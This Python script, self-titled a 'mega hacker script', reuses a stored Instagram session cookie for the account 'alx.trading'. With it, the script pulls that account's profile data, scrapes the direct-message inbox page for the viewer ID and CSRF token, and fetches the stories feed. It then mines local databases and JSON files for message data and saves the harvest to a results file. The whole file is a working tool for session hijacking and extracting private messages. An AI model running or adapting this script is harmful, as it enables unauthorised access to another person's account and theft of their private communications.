#!/usr/bin/env python3
"""
🔥 MEGA HACKER SCRIPT 2025 🔥
รวมทุกสิ่งในโปรเจคเพื่อ extraction
ห้ามซ่อนข้อมูล - แสดงทุกอย่าง!
"""

import requests
import json
import os
import time
import sqlite3
from datetime import datetime

def mega_hack():
    print("🔥 MEGA HACKER SCRIPT STARTING 🔥")
    print("=" * 50)
    
    # โหลด session ที่มีอยู่
    session_file = "/workspaces/sugarglitch-realops/sessions/session-alx.trading"
    try:
        with open(session_file, 'r') as f:
            session_data = json.load(f)
        sessionid = session_data['cookies']['sessionid']
        print(f"✅ Session loaded: {sessionid[:20]}...")
    except:
        print("❌ No session found")
        return
    
    headers = {
        "Cookie": f"sessionid={sessionid}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    results = {
        "hack_time": datetime.now().isoformat(),
        "target": "alx.trading",
        "data_found": []
    }
    
    print("\n🎯 METHOD 1: Profile Info Extraction")
    try:
        url = "https://www.instagram.com/api/v1/users/web_profile_info/?username=alx.trading"
        r = requests.get(url, headers=headers, timeout=10)
        print(f"Profile API: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            if 'data' in data and 'user' in data['data']:
                user = data['data']['user']
                print(f"✅ Profile data extracted!")
                print(f"   Username: {user.get('username')}")
                print(f"   Full name: {user.get('full_name')}")
                print(f"   Bio: {user.get('biography', '')[:100]}...")
                print(f"   Followers: {user.get('edge_followed_by', {}).get('count')}")
                print(f"   Following: {user.get('edge_follow', {}).get('count')}")
                
                results["data_found"].append({
                    "type": "profile_info",
                    "data": user
                })
    except Exception as e:
        print(f"❌ Profile extraction error: {e}")
    
    print("\n🕷️ METHOD 2: Web Page Scraping")
    try:
        r = requests.get("https://www.instagram.com/direct/inbox/", headers=headers, timeout=10)
        print(f"DM page: {r.status_code}")
        
        if r.status_code == 200:
            content = r.text
            
            # หา window._sharedData
            if 'window._sharedData' in content:
                start = content.find('window._sharedData = ') + 21
                end = content.find(';</script>', start)
                if end > start:
                    try:
                        shared_data = json.loads(content[start:end])
                        print("✅ Found _sharedData!")
                        
                        # วิเคราะห์ข้อมูล
                        if 'config' in shared_data:
                            config = shared_data['config']
                            print(f"   Viewer ID: {config.get('viewerId')}")
                            print(f"   CSRF Token: {config.get('csrf_token', '')[:20]}...")
                        
                        results["data_found"].append({
                            "type": "shared_data",
                            "data": shared_data
                        })
                    except:
                        print("❌ Invalid _sharedData JSON")
            
            # หาข้อมูล DM อื่นๆ
            patterns = ['DirectInbox', 'threads', 'messages']
            for pattern in patterns:
                if pattern in content:
                    print(f"✅ Found pattern: {pattern}")
    except Exception as e:
        print(f"❌ Web scraping error: {e}")
    
    print("\n📱 METHOD 3: Stories/Feed Check")
    try:
        stories_url = "https://www.instagram.com/api/v1/feed/reels_tray/"
        r = requests.get(stories_url, headers=headers, timeout=10)
        print(f"Stories API: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            if 'tray' in data:
                print(f"✅ Stories data found! {len(data['tray'])} items")
                results["data_found"].append({
                    "type": "stories",
                    "data": data
                })
    except Exception as e:
        print(f"❌ Stories check error: {e}")
    
    print("\n💾 METHOD 4: Database Files Check")
    db_files = []
    for root, dirs, files in os.walk("/workspaces/sugarglitch-realops"):
        for file in files:
            if file.endswith(('.db', '.sqlite', '.sqlite3')):
                db_files.append(os.path.join(root, file))
    
    print(f"Found {len(db_files)} database files")
    for db_file in db_files:
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            
            print(f"📂 {os.path.basename(db_file)}: {len(tables)} tables")
            
            for table in tables:
                cursor.execute(f"SELECT COUNT(*) FROM {table[0]}")
                count = cursor.fetchone()[0]
                if count > 0:
                    print(f"   {table[0]}: {count} records")
                    
                    # ดึงข้อมูลตัวอย่าง
                    cursor.execute(f"SELECT * FROM {table[0]} LIMIT 3")
                    sample = cursor.fetchall()
                    if sample:
                        print(f"   Sample: {str(sample[0])[:100]}...")
            
            conn.close()
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print("\n⛏️ METHOD 5: JSON Files Mining")
    json_files = []
    for root, dirs, files in os.walk("/workspaces/sugarglitch-realops"):
        for file in files:
            if file.endswith('.json') and any(x in file.lower() for x in ['dm', 'extraction', 'message']):
                json_files.append(os.path.join(root, file))
    
    print(f"Found {len(json_files)} relevant JSON files")
    dm_data = []
    
    for json_file in json_files:
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"📂 {os.path.basename(json_file)}")
            
            # ค้นหาข้อมูล DM
            if isinstance(data, dict):
                if any(key in str(data).lower() for key in ['message', 'text', 'conversation', 'thread']):
                    print("   ✅ Contains potential DM data")
                    dm_data.append({
                        "file": json_file,
                        "data": data
                    })
            elif isinstance(data, list) and data:
                if any(key in str(data[0]).lower() for key in ['message', 'text', 'conversation']):
                    print(f"   ✅ Contains {len(data)} potential messages")
                    dm_data.append({
                        "file": json_file,
                        "data": data
                    })
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    if dm_data:
        results["data_found"].extend(dm_data)
    
    # บันทึกผลลัพธ์
    timestamp = int(time.time())
    result_file = f"/workspaces/sugarglitch-realops/MEGA_HACK_RESULTS_{timestamp}.json"
    
    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"\n🎉 MEGA HACK COMPLETED!")
    print(f"📊 Data types found: {len(results['data_found'])}")
    print(f"📁 Results saved: {result_file}")
    
    # แสดงสรุป
    for item in results["data_found"]:
        print(f"   • {item['type']}")
    
    print(f"\n🔥 HACKING SUCCESSFUL! 🔥")
    return result_file

if __name__ == "__main__":
    mega_hack()
